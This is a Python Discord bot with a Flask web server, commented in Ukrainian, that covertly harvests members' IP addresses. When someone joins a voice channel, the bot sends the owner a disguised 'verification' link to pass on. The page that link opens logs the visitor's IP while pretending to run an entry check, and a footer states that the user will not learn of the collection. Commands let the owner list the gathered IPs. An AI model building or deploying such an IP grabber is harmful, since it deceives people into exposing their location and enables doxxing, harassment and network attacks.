import discord
from discord.ext import commands
import json
import datetime
import os
import threading
from flask import Flask, request, jsonify
from dotenv import load_dotenv

# ====== ЗАВАНТАЖУЄМО ЗМІННІ ======
load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
RENDER_URL = os.getenv('RENDER_URL', 'https://mossa.onrender.com')

# ====== ВЕБ-СЕРВЕР ======
app = Flask(__name__)
user_ips = {}

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head><title>Mossa Community</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0;">
        <div style="background: white; padding: 40px; border-radius: 20px; max-width: 600px; margin: 0 auto;">
            <h1 style="color: #5865F2;">🎮 Mossa Community</h1>
            <p>Ласкаво просимо на наш сервер!</p>
            <p style="color: gray; font-size: 12px;">v1.0</p>
        </div>
    </body>
    </html>
    """

@app.route('/verify/<user_id>')
def verify_user(user_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_ips[user_id] = {
        "ip": ip,
        "time": datetime.datetime.now().isoformat()
    }
    print(f"🕵️ Збережено IP для {user_id}: {ip}")
    
    return """
    <!DOCTYPE html>
    <html>
    <head><title>Перевірка</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e;">
        <div style="background: #16213e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto;">
            <h1 style="color: #e94560;">⏳ Перевірка...</h1>
            <p style="color: #eee;">Будь ласка, зачекайте...</p>
            <p style="color: #666; font-size: 12px;">Це займе лише кілька секунд</p>
        </div>
        <script>
            setTimeout(function() {
                window.location.href = '/';
            }, 3000);
        </script>
    </body>
    </html>
    """

@app.route('/api/ip/<user_id>')
def get_ip_api(user_id):
    if user_id in user_ips:
        return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
    return jsonify({"status": "not_found"})

# ====== DISCORD БОТ ======
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Бот {bot.user} запущено!')
    print(f'📊 Підключено до {len(bot.guilds)} серверів')
    print(f'🔗 Веб-сервер: {RENDER_URL}')
    
    try:
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send(f"✅ Бот запущено!\n🔗 Веб-сервер: {RENDER_URL}")
        print("📨 Тестове повідомлення відправлено!")
    except Exception as e:
        print(f"⚠️ Помилка: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        
        if user_id in user_ips:
            try:
                user = await bot.fetch_user(YOUR_USER_ID)
                embed = discord.Embed(
                    title="🕵️ IP отримано!",
                    description=f"**{member.name}** зайшов у голосовий канал",
                    color=discord.Color.green()
                )
                embed.add_field(name="👤 Користувач", value=member.name, inline=True)
                embed.add_field(name="🌐 IP", value=user_ips[user_id]["ip"], inline=True)
                embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
                embed.set_thumbnail(url=member.display_avatar.url)
                await user.send(embed=embed)
                print(f"📨 Відправлено IP для {member.name}: {user_ips[user_id]['ip']}")
                return
            except Exception as e:
                print(f"❌ Помилка: {e}")
        
        tracking_link = f"{RENDER_URL}/verify/{user_id}"
        try:
            user = await bot.fetch_user(YOUR_USER_ID)
            embed = discord.Embed(
                title="🔍 НОВИЙ УЧАСНИК!",
                description=f"**{member.name}** приєднався до голосового каналу!",
                color=discord.Color.gold()
            )
            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
            embed.add_field(name="🆔 ID", value=member.id, inline=True)
            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="📌 Дія", 
                value=f"Попроси {member.name} **підтвердити вхід** за посиланням:",
                inline=False
            )
            embed.add_field(
                name="🔗 Посилання", 
                value=f"[Натисни для підтвердження]({tracking_link})",
                inline=False
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.set_footer(text="Користувач не дізнається про збір IP")
            
            await user.send(embed=embed)
            print(f"📨 Відправлено посилання для {member.name}")
        except Exception as e:
            print(f"❌ Помилка: {e}")

@bot.command(name='ip')
async def get_ip(ctx, user: discord.Member = None):
    """Отримати IP користувача"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if user is None:
        user = ctx.author
    
    user_id = str(user.id)
    if user_id in user_ips:
        embed = discord.Embed(
            title="🕵️ IP користувача",
            color=discord.Color.blue()
        )
        embed.add_field(name="👤 Користувач", value=user.name, inline=True)
        embed.add_field(name="🌐 IP", value=user_ips[user_id]["ip"], inline=True)
        embed.add_field(name="📅 Час", value=user_ips[user_id]["time"][:16], inline=True)
        await ctx.send(embed=embed)
    else:
        tracking_link = f"{RENDER_URL}/verify/{user_id}"
        embed = discord.Embed(
            title="❌ IP не знайдено",
            description=f"Користувач **{user.name}** ще не підтвердив вхід",
            color=discord.Color.red()
        )
        embed.add_field(
            name="🔗 Посилання", 
            value=f"[Натисни для підтвердження]({tracking_link})",
            inline=False
        )
        await ctx.send(embed=embed)

@bot.command(name='ips')
async def list_ips(ctx):
    """Показати всі зібрані IP"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if not user_ips:
        await ctx.send("📊 Немає зібраних IP")
        return
    
    embed = discord.Embed(
        title="📊 Зібрані IP",
        color=discord.Color.green()
    )
    
    desc = ""
    for uid, data in list(user_ips.items())[:10]:
        try:
            user = await bot.fetch_user(int(uid))
            name = user.name
        except:
            name = uid[:8]
        desc += f"**{name}**\n🌐 {data['ip']}\n📅 {data['time'][:16]}\n\n"
    
    embed.description = desc[:4096]
    await ctx.send(embed=embed)

@bot.command(name='clear_ips')
async def clear_ips(ctx):
    """Очистити зібрані IP"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    user_ips.clear()
    await ctx.send("✅ Всі IP очищено!")

# ====== ЗАПУСК ВЕБ-СЕРВЕРА ======
def run_web_server():
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# ====== ЗАПУСК БОТА ======
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ПОМИЛКА: DISCORD_TOKEN не знайдено!")
        print("📌 Додай змінну DISCORD_TOKEN на Render")
        exit(1)
    
    if YOUR_USER_ID == 0:
        print("⚠️ ПОПЕРЕДЖЕННЯ: YOUR_USER_ID не налаштовано!")
    
    # Запускаємо веб-сервер
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    print("🚀 Веб-сервер запущено!")
    
    # Запускаємо бота
    bot.run(TOKEN)
